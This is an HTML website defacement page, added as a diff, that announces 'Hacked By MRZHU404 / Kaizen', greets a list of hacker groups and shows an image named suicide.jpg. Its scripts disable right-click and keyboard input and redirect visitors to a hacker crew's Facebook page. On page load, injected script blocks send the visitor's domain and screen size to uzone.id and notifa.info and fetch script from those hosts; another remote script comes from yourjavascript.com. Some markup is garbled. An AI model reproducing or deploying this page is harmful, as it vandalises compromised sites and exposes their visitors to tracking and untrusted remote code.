@@ -1,0 +1,233 @@
+﻿<html>
+<head/><title>Hacked By MRZHU404</title>
+<meta name="author" content="Kaizen"/>
+<meta name="description" content="Hacked By Kaizen , Tidak ada seorangpun, hewan atau banci yang disakiti dalam hacking ini ;)"/>
+</head>
+<style type="text/css">@import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);background-color:black;background-repeat:fixed;background-size:99%;background-position:top center;overflow:hidden;cursor:none;margin:0px;}svg{width:600px;height:100px;display:block;position:relative;overflow:hidden;margin:0 auto;background:transparent;}text{filter:url(#filter);fill:white;font-family:'Share Tech Mono',sans-serif;font-size:100px;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}#headM{font-family:Orbitron;position:fixed;left:0px;right:0px;bottom:0px;background:transparent;text-align:center;}.title{font-size:30px;font-family:Abel;font-weight:bold;color:#ffffff;text-shadow:0px 0px 10px black;}.title span{font-size:50px;font-family:Abel;font-weight:bold;color:#ffffff;text-shadow:0px 0px 10px black;}.greets{font-family:Abel;color:black;}.footer{font-family:Orbitron;color:white;font-size:10px;text-shadow:0px 0px 40px black;}</style>
+<script type="text/javascript">
+    function disableselect(e) {
+        return false
+    }
+    function reEnable() {
+            return true
+        }
+        //if IE4+
+    document.onselectstart = new Function("return false")
+        //if NS6
+    if (window.sidebar) {
+        document.onmousedown = disableselect
+        document.onclick = reEnable
+    }
+    var message = "";
+    function clickIE() {
+        if (document.all) {
+            (message);
+            return false;
+        }
+    }
+    function clickNS(e) {
+        if (document.layers || (document.getElementById && !document.all)) {
+            if (e.which == 2 || e.which == 3) {
+                (message);
+                return false;
+            }
+        }
+    }
+    if (document.layers) {
+        document.captureEvents(Event.MOUSEDOWN);
+        document.onmousedown = clickNS;
+    } else {
+        document.onmouseup = clickNS;
+        document.oncontextmenu = clickIE;
+    }
+    document.oncontextmenu = new Function("return false")
+    if ((document.getElementById) &&
+        window.addEventListener || window.attachEvent) {
+        (function() {
+            var num = 30;
+            var timer = 30;
+            var enableinNS6 = 1 
+            var y = [];
+            var x = [];
+            var fall = [];
+            var theFlakes = [];
+            var sfs = [];
+            var step = [];
+            var currStep = [];
+            var h, w, r;
+            var d = document;
+            var pix = "px";
+            var domWw = (typeof window.innerWidth == "number");
+            var domSy = (typeof window.pageYOffset == "number");
+            var idx = d.getElementsByTagName('div').length;
+            if (d.documentElement.style &&
+                typeof d.documentElement.style.MozOpacity == "string")
+                num = 12;
+            for (i = 0; i < num; i++) {
+                sfs[i] = Math.round(1 + Math.random() * 1);
+
+                document.write('<div id="flake' + (idx + i) + '" style="position:absolute;top:0px;left:0px;width:' + sfs[i] + 'px;height:' + sfs[i] + 'px;background-color:#ffffff;font-size:' + sfs[i] + 'px"><\/div>');
+                currStep[i] = 0;
+                fall[i] = (sfs[i] == 1) ?
+                    Math.round(2 + Math.random() * 2) : Math.round(3 + Math.random() * 2);
+                step[i] = (sfs[i] == 1) ?
+                    0.05 + Math.random() * 0.1 : 0.05 + Math.random() * 0.05;
+            }
+            if (domWw) r = window;
+            else {
+                if (d.documentElement &&
+                    typeof d.documentElement.clientWidth == "number" &&
+                    d.documentElement.clientWidth != 0)
+                    r = d.documentElement;
+                else {
+                    if (d.body &&
+                        typeof d.body.clientWidth == "number")
+                        r = d.body;
+                }
+            }
+            function winsize() {
+                var oh, sy, ow, sx, rh, rw;
+                if (domWw) {
+                    if (d.documentElement && d.defaultView &&
+                        typeof d.defaultView.scrollMaxY == "number") {
+                        oh = d.documentElement.offsetHeight;
+                        sy = d.defaultView.scrollMaxY;
+                        ow = d.documentElement.offsetWidth;
+                        sx = d.defaultView.scrollMaxX;
+                        rh = oh - sy;
+                        rw = ow - sx;
+                    } else {
+                        rh = r.innerHeight;
+                        rw = r.innerWidth;
+                    }
+                    h = rh - 2;
+                    w = rw - 2;
+                } else {
+                    h = r.clientHeight - 2;
+                    w = r.clientWidth - 2;
+                }
+            }
+            function scrl(yx) {
+                var y, x;
+                if (domSy) {
+                    y = r.pageYOffset;
+                    x = r.pageXOffset;
+                } else {
+                    y = r.scrollTop;
+                    x = r.scrollLeft;
+                }
+                return (yx == 0) ? y : x;
+            }
+            function snow() {
+                var dy, dx;
+                for (i = 0; i < num; i++) {
+                    dy = fall[i];
+                    dx = fall[i] * Math.cos(currStep[i]);
+                    y[i] += dy;
+                    x[i] += dx;
+                    if (x[i] >= w || y[i] >= h) {
+                        y[i] = -10;
+                        x[i] = Math.round(Math.random() * w);
+                        fall[i] = (sfs[i] == 1) ?
+                            Math.round(2 + Math.random() * 2) : Math.round(3 + Math.random() * 2);
+                        step[i] = (sfs[i] == 1) ?
+                            0.05 + Math.random() * 0.1 : 0.05 + Math.random() * 0.05;
+                    }
+                    theFlakes[i].top = y[i] + scrl(0) + pix;
+                    theFlakes[i].left = x[i] + scrl(1) + pix;
+                    currStep[i] += step[i];
+                }
+                setTimeout(snow, timer);
+            }
+            function init() {
+                winsize();
+                for (i = 0; i < num; i++) {
+                    theFlakes[i] = document.getElementById("flake" + (idx + i)).style;
+                    y[i] = Math.round(Math.random() * h);
+                    x[i] = Math.round(Math.random() * w);
+                }
+                snow();
+            }
+            if (window.addEventListener) {
+                window.addEventListener("resize", winsize, false);
+                window.addEventListener("load", init, false);
+            } else if (window.attachEvent) {
+                window.attachEvent("onresize", winsize);
+                window.attachEvent("onload", init);
+            }
+        })();
+    }
+</script>
+<body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
+<center>
+<script language="JavaScript1.2">
+/*
+SCRIPT EDITE SUR L'EDITEUR JAVASCRIPT
+http://www.editeurjavascript.com
+*/
+
+function ejs_nodroit()
+	{top.location.href="https://www.facebook.com/sec7orcrew/"}
+document.oncontextmenu = ejs_nodroit;
+</script>
+<svg version="1.1" id="Ebene_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="600px" height="100px" viewBox="0 0 1100 80">
+<defs>
+<filter id="filter">
+<feFlood flood-color="black" result="black"/>
+<feFlood flood-color="red" result="flood1"/>
+<feFlood flood-color="limegreen" result="flood2"/>
+<feOffset in="SourceGraphic" dx="3" dy="0" result="off1a"/>
+<feOffset in="SourceGraphic" dx="2" dy="0" result="off1b"/>
+<feOffset in="SourceGraphic" dx="-3" dy="0" result="off2a"/>
+<feOffset in="SourceGraphic" dx="-2" dy="0" result="off2b"/>
+<feComposite in="flood1" in2="off1a" operator="in" result="comp1"/>
+<feComposite in="flood2" in2="off2a" operator="in" result="comp2"/>
+<feMerge x="0" width="100%" result="merge1">
+<feMergeNode in="black"/>
+<feMergeNode in="comp1"/>
+<feMergeNode in="off1b"/>
+<animate attributeName="y" id="y" dur="4s" values='104px; 104px; 30px; 105px; 30px; 2px; 2px; 50px; 40px; 105px; 105px; 20px; 6ÃŸpx; 40px; 104px; 40px; 70px; 10px; 30px; 104px; 102px' keyTimes='0; 0.362; 0.368; 0.421; 0.440; 0.477; 0.518; 0.564; 0.593; 0.613; 0.644; 0.693; 0.721; 0.736; 0.772; 0.818; 0.844; 0.894; 0.925; 0.939; 1' repeatCount="indefinite"/>
+<animate attributeName="height" id="h" dur="4s" values='10px; 0px; 10px; 30px; 50px; 0px; 10px; 0px; 0px; 0px; 10px; 50px; 40px; 0px; 0px; 0px; 40px; 30px; 10px; 0px; 50px' keyTimes='0; 0.362; 0.368; 0.421; 0.440; 0.477; 0.518; 0.564; 0.593; 0.613; 0.644; 0.693; 0.721; 0.736; 0.772; 0.818; 0.844; 0.894; 0.925; 0.939; 1' repeatCount="indefinite"/>
+</feMerge>
+<feMerge x="0" width="100%" y="60px" height="65px" result="merge2">
+<feMergeNode in="black"/>
+<feMergeNode in="comp2"/>
+<feMergeNode in="off2b"/>
+<animate attributeName="y" id="y" dur="4s" values='103px; 104px; 69px; 53px; 42px; 104px; 78px; 89px; 96px; 100px; 67px; 50px; 96px; 66px; 88px; 42px; 13px; 100px; 100px; 104px;' keyTimes='0; 0.055; 0.100; 0.125; 0.159; 0.182; 0.202; 0.236; 0.268; 0.326; 0.357; 0.400; 0.408; 0.461; 0.493; 0.513; 0.548; 0.577; 0.613; 1' repeatCount="indefinite"/>
+<animate attributeName="height" id="h" dur="4s" values='0px; 0px; 0px; 16px; 16px; 12px; 12px; 0px; 0px; 5px; 10px; 22px; 33px; 11px; 0px; 0px; 10px' keyTimes='0; 0.055; 0.100; 0.125; 0.159; 0.182; 0.202; 0.236; 0.268; 0.326; 0.357; 0.400; 0.408; 0.461; 0.493; 0.513;  1' repeatCount="indefinite"/>
+</feMerge>
+<feMerge>
+<feMergeNode in="SourceGraphic"/>
+<feMergeNode in="merge1"/>
+<feMergeNode in="merge2"/>
+</feMerge>
+</filter>
+</defs>
+<body bgcolor="black">
+<script src='http://yourjavascript.com/1171704334/efek-salju-faisal.js' type='text/javascript'/></script>
+<script type="text/javascript">if(typeof document.onselectstart!="undefined"){document.onselectstart=new Function("return false");}else{document.onmousedown=new Function("return false");document.onmouseup=new Function("return true");}</script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKntLcDQevFrVPADusAlH5WIiXmycWWY%2fT627nfzNfuVHctH9Dop8UTn3UItuFMRwVPECqRtcOBQhEVNKQK4KD2LPP1uZp0%2fhqF0ptoP2mt2Wm5ocze9e6VQexkrk%2bV9sXGBTf%2fnmFfMgy4EALYoNjMcgYDU9CqGymQSD40kf%2fI4NWvRRFMYS07ejeg5BprNmdu3WfxIEcuQ%2bnUW5u57OL75mEFcjz%2f3ms6HtvRe1s%2bO9bod67PRbNGIiazeVxIp22OEkolgUPgQ1uld7R%2bLjug6aD9dJ%2fz%2bMrG6Q2Da%2fvUk1fMbIuwGF8QVk5T2eqWvrIUJmat6CuY1FyWZ3aGtgflrT24E67qYuJn3jYQQD7UKZSPK%2fsIieuzcxBfWKuVBR4hQMLbzRhETljOkM4nD2KihIVEQhiHuBzIvPPJ4WuVLP2DPQqLtq%2b5wzo5iPtb5eNdWf%2bzvMr9xlqVvtWDwRv1KbqyUNvJnIpM%2bPYIngTUOpqU9iIF15VWnuDVKLzSpnV7emZoLnp28fj8x%2fr%2b9N%2ffw%3d%3d + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8baOde6L0gxv4zSy2q0hodB7gpbjSbaPB84nPdgsLn92bn%2bxEo6%2bNi%2faOdlQzGTKPFAM4NpYPCZt53JCFLXrR4Hy8ed3NEtEizr%2bWvmDdCChmKNvLWQX1Xiw41e1aaEbGZTFwhUQpOaOPYycJMcaVXlf0Xu2Gp5rGF6DHO86ki0ZsM%2fvrLSAlLWGCSrJ2EMair54xGtN%2fo0ZeSssSzyPGd8HOgBx9SkkSurSYygFqwUEymnajLUJF7YQGOBIMbWSnDJ4XFFKsI8u5LGxXqQmYWtlv%2fTxziGjKlestL%2bdTXRn%2f3jpK1gN49L4wjYt0WIh5UZ%2fmx%2fl%2bQZqRAGlhm064MXjlT6MpIPSjRCJpSb5nJOGL4o15DxdClUfgr6do%2fY7SOaQe9y4ctJ%2bHrf36dZMbnyD28VoGBF4tAuEA6iitSB0vx4fcDKbr1GwjBnF0U0DYltxVYkYyw8l4Wh%2fcobwAg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<link href='http://fonts.googleapis.com/css?family=Wallpoet' rel='stylesheet' type='text/css'>
+<style type="text/css">.sign{text-align:right}</style>
+<br>
+<div align="center">
+<img src="https://mylocalnews.us/arizona/wp-content/uploads/sites/50/2017/11/suicide.jpg" width="450" height="250">
+</div>
+<body bgcolor="white" text="green">
+<center>
+<center><h1>
+<P><font color="white" size="6" face="arial">&#1581;&#1614;&#1587;&#1618;&#1576;&#1615;&#1606;&#1614;&#1575; &#1575;&#1604;&#1604;&#1614;&#1617;&#1607;&#1615; &#1608;&#1614;&#1606;&#1616;&#1593;&#1618;&#1605;&#1614; &#1575;&#1604;&#1618;&#1608;&#1614;&#1603;&#1616;&#1610;&#1604;&#1615;<br></font>
+<p><font color="#8380f0" size="3" face="arial">
+<br>
+<font color="#8380f0" size="4" face="arial">$ KAIZEN JOINED IN YOUR SITE ;) $ <br>
+at last, Tidak ada seorangpun, hewan atau banci yang disakiti dalam hacking ini ;)
+<center>
+   <center><font size="2" color="#8380f0">Greatz :<br><font color="white" size="2">Mauritania Attacker - Virusa Worm - X-m3n - Dr.SaM!M_008 - Mr Domoz - Maniak k4Sur - PirateX - Bl4ck Jorozz - KingSkrupellos - Black Cracker<br>Don Maverick RevCrew - V0RT3X - Con7ext - HiddenCoder - Tanpa Bicara - Cyb3r Gh05t - Roosevelt - Evil<br> 
+<center><font size="2" color="#8380f0"> <br><font color="white" size="2">AnonGhost Sec - Cyberizm.Org - LulzSec - Brasil Cyber Army - Xai Syndicate - X-Protocol - Mauritania Hacker Team - iMHATiMi.ORG<br>TeaMp0isoN - Rusian Hacker - ZoRRokin - ZHC - BD Hacker Team - Turkish Hacktivish<br><br>
+   <font color="#8380f0" size="2">
+	<footer>
+	International Hacker Rulez © 2018
+	</footer> 
+</div>
+</center>
+</html>
